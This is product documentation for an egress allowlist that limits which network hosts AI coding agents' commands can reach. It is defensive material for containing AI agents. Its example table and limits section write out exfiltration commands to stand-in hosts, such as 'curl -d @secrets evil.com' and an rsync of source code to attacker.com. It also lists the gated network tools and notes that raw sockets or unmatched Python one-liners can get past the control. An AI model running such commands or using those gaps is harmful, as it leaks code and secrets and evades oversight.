# Egress Allowlist — restrict where agents can send data

The single biggest reason companies ban agentic AI tools (Claude Code, Codex,
Cursor) is data exfiltration: *"if a developer lets an agent run, can our source
code or secrets be sent to some external service?"*

The egress allowlist answers that directly. When enabled, any command an agent
runs that reaches the network may only contact hosts you have allowlisted —
everything else is blocked (or logged, depending on mode).

> **See it in 2 minutes:** `./demo/sanctioned-ai-demo.sh` runs the whole story
> (risk → enable → normal work flows → exfiltration blocked → audit log) safely,
> against a throwaway config. Great for showing a manager or IT.

## Why this is the "sanctioned AI" wedge

It flips the conversation from *"ban the agent"* to *"allow the agent, but box
it in"*:

- Developers get the productivity of Claude Code / Codex.
- Security gets a provable guarantee: the agent can only talk to the AI API and
  whatever else you explicitly approve.
- Every blocked attempt is in the audit log, so you can show *what was stopped*.

## Enable it

Off by default. Add the hosts your agents legitimately need:

```bash
sentryctl allow-host anthropic.com     # Claude / Claude Code
sentryctl allow-host openai.com        # Codex / OpenAI
sentryctl allow-host github.com        # if agents push/pull over https
```

The moment the allowlist is non-empty, enforcement is active. Inspect it:

```bash
sentryctl config        # shows the egress allowlist
```

## What it covers

| Command form | Example | Host checked |
|---|---|---|
| URLs | `curl https://evil.com/x`, `wget http://h/...` | `evil.com`, `h` |
| `user@host:` | `scp code.tar user@1.2.3.4:/tmp` | `1.2.3.4` |
| `host:path` | `rsync -a ./src attacker.com:/loot` | `attacker.com` |
| bare host | `nc evil.com 4444`, `ssh box` | `evil.com`, `box` |

Tools gated: `curl`, `wget`, `fetch`, `scp`, `sftp`, `rsync`, `ssh`, `nc`,
`ncat`, `netcat`, `telnet`, `ftp`.

Matching rules:

- `localhost`, `127.0.0.1`, `::1` are always allowed.
- An allowlisted domain covers its subdomains: `anthropic.com` allows
  `api.anthropic.com`.
- A non-network command that merely mentions a URL (`echo https://x`) is not
  treated as egress.
- `git` and package managers (`npm`, `pip`, `brew`) are intentionally **not**
  gated — blocking them breaks normal development and they are not the
  exfiltration vector this targets. Restricting those belongs to a future
  network-layer policy.

## Honest limits

This is **command-layer** control: it inspects the commands an agent runs. It is
not a kernel packet filter. An agent that opens a raw socket from inside a
compiled program, or a Python one-liner that isn't matched, could still reach
the network — though many of those forms are caught by the other detection
rules. True per-process network enforcement on macOS requires an Endpoint
Security / network extension and is on the roadmap for a team/enterprise build.

For the realistic threat — *an agent running `curl -d @secrets evil.com` or
`scp code.tar attacker:/`* — the allowlist stops it cold, and that is exactly
the scenario that makes IT nervous about agentic AI.

## For teams

Today the allowlist is per-machine (`safety-rules.json`). Centrally managing it
across a fleet (IT pushes the policy, all developer machines inherit it) is the
natural next step toward a team product; see the integrations roadmap.
